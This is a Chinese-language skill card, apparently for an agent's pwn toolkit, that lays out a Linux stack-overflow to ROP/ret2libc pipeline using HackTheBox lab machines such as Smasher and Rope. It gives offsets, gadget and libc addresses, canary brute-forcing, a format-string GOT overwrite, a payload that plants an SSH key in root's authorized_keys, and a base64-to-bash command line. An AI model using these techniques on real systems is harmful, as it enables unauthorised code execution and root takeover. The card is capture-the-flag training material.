---
name: 'linux-binary-stack-rop'
description: '靶机跑着自编译 C 二进制或未知端口服务,源码里有 strcpy/printf(用户输入),checksec 见 Partial RELRO + No PIE、报错 *** stack smashing detected ***、能拿 Done. 当 canary 预言机 —— 栈溢出→偏移→保护判断→泄 libc→ROP/ret2libc/one_gadget 流水线。（检索词：stack overflow/stack buffer overflow/ROP/ret2libc/stack canary/canary brute force/format string/GOT overwrite/one_gadget/pwntools/cyclic/offset/栈溢出/缓冲区溢出/格式化字符串/溢出偏移/保护绕过/stack-overflow/stack-buffer-overflow/stack-canary/canary-brute-force/format-string/GOT-overwrite/linux/binary/binary exploitation/binary-exploitation/pwn/exploit）'
whenToUse: '靶机上摸到自编译或未知端口的二进制服务,或拿到 SUID 二进制连同源码,需要把一个崩溃做成可交互 shell 时。'
metadata: { domain: pwn, tier: T2 }
---

# Linux 二进制栈溢出与 ROP 实战流水线

> Insane 官方 WP 逐台回核,**8 台命中**:Jail / Smasher / Rope / Ouija / MagicGardens(Linux 5)+ BigHead / Bankrobber / Reaper(Windows 对照 3)。

## 触发信号

| 可观察现象 | 出处 |
|---|---|
| 端口上跑**自编译 C 二进制**:7411 / 1111 `Shenfeng tiny-web-server` / 9999 / 1337 `contact`·`harvest` | Jail·Smasher·Rope·MagicGardens |
| 未知服务发什么都回固定串:`[x] Handshake error` / `Done.` | MagicGardens·Smasher·Rope |
| 源码里 `strcpy`/`sprintf`/`printf(用户输入)`;拷贝长度常量大于目标缓冲 | Smasher(`MAXLINE` 1024→`filename` 512)、MagicGardens(`strcpy` 进 `local_38`) |
| 报错含 `*** stack smashing detected ***`;`checksec` 见 Partial RELRO + No PIE,或 PIE 全开但 GOT 仍可写 | Rope / Smasher·Rope |
| 应用调了**本文件没定义的函数**,或 `php.ini` 有 `extension=xxx.so`;校验逻辑里 `size_t` 被强转 `short` | Ouija(`lverifier.so`) |

## 前置验证

```bash
file ./httpserver && checksec ./httpserver     # 位数/RELRO/PIE/canary → 直接决定路线

# 🔴 libc 必须从目标机下载,不能用本地 libc 的偏移
wget http://10.10.10.89:1111//lib/x86_64-linux-gnu/libc.so.6 -O libc.so.6
readelf -s libc.so.6 | grep -E ' (read|system|dup2)@@'
```

- 只能泄漏不能下载 → 泄已知符号地址,拿 build-id 去 libc 数据库反查版本。
- 确认**崩溃即重启**(`while true; do cd /opt/www; ./httpserver; done`)→ 多段 ROP 与爆破才可行。

## 模式 1:定位崩溃点与偏移

源码审计优先于盲 fuzz:找**拷贝长度**与**目标缓冲**不匹配的函数;算完必须 GDB 复核。

```bash
gdb -q tiny -ex r
curl localhost:9999/$(msf-pattern_create -l 1024)     # 偏移 568
pattern_create.rb -l 100 && python3 -c '...index("Ab6...Ad6")'
```

| 机器 | 偏移与缓冲 |
|---|---|
| Smasher | `url_decode()` 把 `MAXLINE`(1024)拷进 512 字节 `filename` → **偏移 568** |
| MagicGardens | `log_packet()` 只认 16 位长度,接收缓冲 `32680*2 = 65360` < IPv6 上限 65575;`-l 100` 后**文件名少前 12 字节**,payload 实为 `12 + 65360` |
| Ouija | 分配 16 字节;`new_username_copy` 与 `log_path` 相距 16,`log_path` 112 字节后紧跟 `log_data` |
| Jail/BigHead/Bankrobber/Reaper | 返回地址偏移 `28` / `"A"*72+"B"*8` / `32` / `88` |

## 模式 2:判断保护并选路线

| 保护组合 | 路线 | 案例 |
|---|---|---|
| No PIE + 栈可执行 + 无 canary | 返回地址直接跳 **shellcode** | Jail(`p32(0xffffd630)`) |
| No PIE + NX + Partial RELRO | **两段 ret2libc**:先 `write` 泄 GOT 再收尾 | Smasher |
| PIE + canary（RELRO 口径**待实测**，见下注） | 先 **LFI 读 `/proc/self/maps`** 泄基址再 ROP | Rope |
| 32 位 + GOT **可写**（⇒ 非 Full RELRO，即 Partial RELRO）+ 格式化字符串 | `%n` **覆写 GOT**,`puts`→`system` | Rope |
| canary + 父进程 `fork()` + 稳定回显 | **逐字节爆 canary** | Rope(root `contact`) |
| IAT 无 `VirtualProtect`(Windows) | **IAT-only ROP**,`VirtualAlloc` 顶替 | Reaper |

> ⚠️ **前提存疑（本卡无本地二进制可实测，勿照抄任一行的 RELRO 断言）**：上表第 3、4 行曾互斥（一行写 Full RELRO、一行写 GOT 可写；Full RELRO ⇒ GOT **只读**）。
> 本卡内部证据（§5.3 `fmtstr_payload(53, {puts: system})` 要求 GOT 可写；§识别表的「PIE 全开但 GOT 仍可写」）**指向 GOT 可写**，但这只是卡内自洽推断、不是实测。
> 选路规则：**先跑一次 `checksec ./<binary>`** —— 见 Full RELRO ⇒ 只走 `/proc/self/maps` 泄漏（GOT 覆写必失败）；见 Partial RELRO ⇒ 两行都可用（maps 泄漏更稳）。

## 模式 3:泄漏地址

```bash
# GOT 泄漏(No PIE):只泄 read@GOT 自己算基址
# pop_rsi=p64(0x4011db) pop_rdi=p64(0x4011dd) fd=p64(4)
# addr_read=p64(0x603088) addr_write=p64(0x400c50)
# libc_base = leaked_read - 0x0f7250
# system=+0x45390   sh=+0x18cd57   dup2=+0xf7970
```

| 机器 | 细节 |
|---|---|
| Smasher | 没有 `puts` 只有 `write`;泄 `read@GOT`(`0x603088`),`read` 偏移 `0x0f7250` |
| Rope | PIE;LFI 读 `//proc/self/maps` 一次拿 `binary_base` 与 `libc_base`(fork 子进程继承映射) |
| Rope(root) | `write(4, write@GOT, 0x8)` 反推;**RDI 里已有 fd 4**,无需手动设置 |

## 模式 4:构造 ROP

```bash
# 寄存器靠 gadget 组合;无裸 pop rsi → pop rsi; pop r15; ret @0x1649 补垃圾值
# pop rdx; ret @0x1265 / pop rdi; ret @0x164b            (Rope)
# 收尾:dup2(4,0) → dup2(4,1) → pop_rdi + p64(sh) + p64(system)
```

| 机器 | 细节 |
|---|---|
| Smasher | `dup2(4,0)`、`dup2(4,1)` 后 `system('/bin/sh')` 得 `www` shell |
| Rope(root) | `savedRip` 与二进制基址固定差 **`0x1562`**;清零 `rsi`/`rdx` 后跳 one_gadget `libc_base+0x4f322`(`execve("/bin/sh", rsp+0x40, environ)`) |

## 模式 5:特殊场景

**5.1 整数截断型溢出(Ouija)** —— 分配按截断后的小值、拷贝按真实长度:

```bash
# lverifier.so: -((long)(short)((short)strlen(p) + 10) + 0xf & ~0xf)
# 长度 65535 → (short) 回绕 -1 → -1+10+15 = 24 → &~0xf = 16 字节
p = "A"*16 + "/root/.ssh/authorized_keys\n" + "B"*85 + "\n<pub_key>\n" + "C"*(65535-len(p))
# POST 到 http://127.0.0.1:9999/index.php 的 username 字段,让 event_recorder() 写公钥
```

**5.2 canary 预言机爆破(Rope root)** —— 前提:**父进程 fork 且子进程 canary 相同** + **明确成败回显**:

```bash
# "A"*56 + 已知字节 + 猜测字节;收到 Done. 即命中
# 超 56 字节回 stack smashing detected → 拿它当 oracle 爆 canary/RBP/savedRip
```

**5.3 纯格式化字符串(Rope)**:

```bash
AAAAAAAA.%53$x                          # 输入落在栈上第 53 个偏移;% 在 URL 里编成 %25
fmtstr_payload(53, { puts : system })   # 此后 puts("GET") 实际执行 system("GET")
```

## 快速检查清单

```bash
[ ] file + checksec 拿到位数/RELRO/PIE/canary 结论
[ ] 崩溃确认 + pattern 偏移,GDB vmmap 复核;远端 libc 已下载并 readelf 校准
[ ] 泄漏路线选好:GOT / /proc/self/maps / 格式化字符串任意读
[ ] gadget 齐(pop rdi/rsi/rdx;缺 rsi 用 pop rsi; pop r15 补垃圾)
[ ] dup2(4,0)/dup2(4,1) 接上标准流;fork + 回显稳定 → 可以爆 canary
[ ] payload 的空格 / % / \x00 在传输层会不会被吃掉
```

## 教训

1. 源码与编译产物同时暴露时审计远快于盲 fuzz;`Makefile` 的编译选项就是可行性结论。
2. 🔴 **libc 偏移必须来自目标机自己的 `libc.so.6`**,本地 glibc 不一致会让整条链静默失败。
3. 🔴 **PIE 下基址不能猜**:读 `/proc/self/maps`(Rope)或先泄 GOT 回推(Smasher);Jail 的固定栈地址只在无 ASLR 的老环境成立。读 maps 时它是虚拟文件、`st_size` 为 0,按长度发送的服务返回空 → 加 `Range: bytes=0-1000` 走 `sendfile()`。
4. 🔴 **`dup2` 不是可选项**:socket 不接 0/1 则 shell 无法交互。`system('/bin/sh')`(Smasher)与 one_gadget 的 `execve`(Rope)都能成,后者对 `rsi`/`rdx`/`rsp+0x40` 有隐式约束,不满足就**静默死掉**。动手前先看寄存器里已有什么(Rope 的 RDI 已有 fd 4)。
5. 🔴 **传输层会吃 payload**:HTTP 请求行不能有空格 → `${IFS}`(`echo${IFS}<base64>|base64${IFS}-d|bash`);`%`→`%25`;反代会 URL 编码毁二进制,BigHead 用 `Content-Encoding: gzip` 保真。
6. 整数截断的判据不是"缓冲区小",而是**同一个长度被用在不同类型上**。Windows 侧同源:Bankrobber 偏移 32 后**直接把命令拼进溢出串**、BigHead 缓冲太小就**堆喷 + egghunter**(JMP EAX `f2125062`)、Reaper **只用 IAT 内 gadget + `VirtualAlloc`**。

## 相关卡

- `challenge-heap-pwn` —— 崩溃点不在栈上:`malloc`/`free`/tcache/UAF 才是主战场。
- `challenge-kernel-pwn` —— 目标是 `.ko` 或要 `insmod`,溢出在内核态。
- `shared-object-hijacking` —— Rope 里 `ldd` 发现可写 `liblog.so`:不用写 exploit,改库就横向。
- `challenge-insane-playbook` —— 手上其实是独立 pwn 挑战(附件形态)时先做领域路由。
